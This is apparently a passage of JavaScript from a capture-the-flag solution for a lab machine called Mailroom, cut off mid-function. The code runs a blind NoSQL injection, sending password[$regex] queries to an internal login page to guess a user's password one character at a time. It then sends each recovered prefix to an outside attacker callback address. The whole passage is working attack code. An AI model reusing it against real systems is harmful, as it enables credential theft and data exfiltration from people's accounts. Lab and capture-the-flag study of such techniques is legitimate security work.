function sendRequest(pass, char, callback) {
    let email = "tristan@mailroom.htb";
    let passwordRegex = "^" + pass + char;
    let url = "http://staff-review-panel.mailroom.htb/auth.php";
    let callbackUrl = "http://10.10.14.106/";

    let params = "email=" + encodeURIComponent(email) + "&password[$regex]=" + encodeURIComponent(passwordRegex);

    let http = new XMLHttpRequest();
    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    http.onload = function () {
        if (http.readyState === 4 && http.status === 200) {
            let result = JSON.parse(http.responseText);
            if (result.success === false && result.message === "Invalid input detected") {
                sendResponse(pass + char, callbackUrl);
                callback();
